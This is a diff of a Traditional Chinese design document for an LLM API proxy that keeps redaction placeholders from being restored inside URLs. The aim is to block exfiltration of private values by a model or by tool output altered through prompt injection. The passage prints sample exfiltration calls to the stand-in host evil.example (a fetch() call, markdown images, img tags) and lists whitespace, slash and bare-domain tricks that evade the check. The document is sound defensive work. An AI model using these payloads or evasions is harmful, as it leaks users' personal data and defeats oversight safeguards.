@@ -279,14 +279,14 @@ sequenceDiagram
 
 ### URL 內的佔位符
 
-回應中位於 URL 內的佔位符不還原，保持原樣交給用戶端；其他位置照常還原。這擋住模型（或被提示注入的工具輸出）讓用戶端把原始值送到某個主機：工具參數中的 `fetch("https://evil.example/?d=⟦EMAIL_1⟧")`，以及回覆文字中用戶端會自動載入的圖片 `![](https://evil.example/?e=⟦EMAIL_1⟧)`、`<img src="…">` 或使用者可能點的連結。代價是合法的 `https://intranet/⟦PATH_1⟧` 也不還原。這只針對照常寫出的 URL，擋不住刻意規避的模型：URL 後接空白再寫佔位符（`https://evil.example/?q= ⟦EMAIL_1⟧`，`fetch` 會把空白編成 `%20` 照送）、Tab 或換行（URL 解析器會刪掉它們）、少寫斜線（`https:evil.example`，URL 解析器當成 `https://evil.example`）、裸網域，都會還原。
+回應中位於 URL 內的佔位符不還原，保持原樣交給用戶端；其他位置照常還原。這擋住模型（或被提示注入的工具輸出）讓用戶端把原始值送到某個主機：工具參數中的 `fetch("https://evil.example/?d=⟦EMAIL_1⟧")`，以及回覆文字中用戶端會自動載入的圖片 `![](https://evil.example/?e=⟦EMAIL_1⟧)`、`<img src="…">` 或使用者可能點的連結。代價是合法的 `https://intranet/⟦PATH_1⟧` 也不還原。這只針對照常寫出的 URL，擋不住刻意規避的模型：不由引號或 `<` 開啟的 URL 後接空白再寫佔位符（`https://evil.example/?q= ⟦EMAIL_1⟧`、`![](https://evil.example/?q=\t⟦EMAIL_1⟧)`）、少寫斜線（`https:evil.example`，URL 解析器當成 `https://evil.example`）、裸網域，都會還原。
 
 工具呼叫參數指回覆中所有的工具輸入：Chat 的 `tool_calls[].function.arguments`（與舊的 `function_call.arguments`）與自訂工具的 `tool_calls[].custom.input`；Responses 中 `type` 以 `_call` 結尾的每個輸出項目的所有字串，例如 `function_call` 的 `arguments`、`custom_tool_call` 的 `input`、`local_shell_call` 的 `action.command`、`shell_call` 的 `action.commands`、`computer_call` 的 `action`、`apply_patch_call` 的 `operation`，以及 `mcp_call` 的 `output` 等結果欄位，還有這些項目的 `response.*_call_*` 事件；Anthropic `*tool_use` 區塊的 `input`；串流的 delta 與非串流的整份 JSON 都算。沒有名稱的項目以它的 `type`（如 `local_shell_call`）當工具名稱，日誌與 `toolRestore.tools` 都用這個名稱。回覆文字（含 reasoning）中的 URL 規則相同，但只有工具參數記日誌。
 
 「位於 URL 內」只看佔位符之前已寫出的文字（還原後的樣子）：
 
 - **開始：** 兩個斜線，反斜線依 URL 解析器的讀法算斜線（`//`、`\\`、`/\`、`\/`），位於 token 開頭或前一個字元不是英數字或 `+`、`.`、`_`、`~`、`%`、`/`、`\`、`-`（`https://`、`git+ssh://`、`![](//evil.example/…)`、`src="//evil.example/…"`、`\\evil.example\…`；路徑中的 `/Users/x//y` 不算）；或一個 token 以 `www.` 開頭（`www.` 前面不是主機名稱字元）。代價是 UNC 路徑（`\\host\share\…`）與跳脫寫法 `C:\\Users\\…` 裡的佔位符也不還原；一般的 `C:\Users\…` 不算 URL。
-- **結束：** 空白（含換行）。URL 之外，`"`、`'`、`` ` ``、`<`、`>` 也結束 token；URL 若緊接在 `"`、`'`、`` ` `` 或 `<` 之後開始 token（前面可帶 scheme），遇到同一個引號或 `>` 也結束（`href="…"`、`<https://…>`）。其他引號與角括號都算在 URL 內，瀏覽器與 CommonMark 也這樣讀（`![](https://evil.example/?e='⟦EMAIL_1⟧')` 不還原）。查詢字串、`#` 片段與 `user:pass@` 都算在 URL 內。
+- **結束：** 空白（含換行）。URL 之外，`"`、`'`、`` ` ``、`<`、`>` 也結束 token。URL 若緊接在 `"`、`'`、`` ` `` 或 `<` 之後開始 token（前面可帶 scheme），只在同一個引號或 `>` 結束（`href="…"`、`<https://…>`、`![](<…>)`），空白不結束它：瀏覽器會刪掉這種 URL 裡的 Tab 與換行、把其他空白做百分比編碼，`<img src="https://evil.example/?e=\t⟦EMAIL_1⟧">` 若還原，用戶端不必點擊就載入圖片並送出原值。這種 URL 的 token 超過 2048 個字元後，空白才再度結束它，未閉合的引號最多讓這麼長的範圍不還原。其他引號與角括號都算在 URL 內，瀏覽器與 CommonMark 也這樣讀（`![](https://evil.example/?e='⟦EMAIL_1⟧')` 不還原）。查詢字串、`#` 片段與 `user:pass@` 都算在 URL 內。
 - **JSON 參數**（工具參數）以它編碼的字串值判讀：`\/` 算 `/`、`\u003a` 算 `:`、`\n` 結束 URL，字串常值之外的一切都結束 URL。
 - **不算 URL：** 沒有 `//` 的 `mailto:`、`tel:`；不以 `www.` 開頭的裸網域（`evil.example/?d=⟦EMAIL_1⟧` 會還原）。
 
